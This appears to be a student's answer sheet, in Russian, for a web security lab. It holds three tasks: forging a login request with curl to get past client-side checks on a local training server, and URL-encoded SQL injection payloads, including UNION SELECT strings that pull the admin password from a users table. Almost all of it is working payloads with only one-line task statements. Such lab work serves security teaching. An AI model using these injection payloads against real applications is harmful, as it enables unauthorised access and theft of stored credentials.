### Задание 2

Обойти клиентскую защиту с помощью curl.
	curl "http://192.168.200.100:8080/signin" \
	--data-raw "name=Ksenia&pass=asdfgh&banned=true"


### Задание 3

Обойти защиту с помощью кодирования кавычки в альтернативный формат 
(Url encoded).

	%27 OR 1=1;--


### Задание 4

Обойти защиту с помощью кодирования кавычки в альтернативный формат (Url encoded) и получить пароль из БД.

	%27 union select pass from users where name = %27admin%27--

Инъекция в числовом параметре 

    -1 UNION SELECT 1, pass FROM users WHERE name = %27admin%27--

Union select Injection

    ' UNION SELECT null, (SELECT name || '--' || pass
    FROM users WHERE name = %27admin%27--), null FROM dual --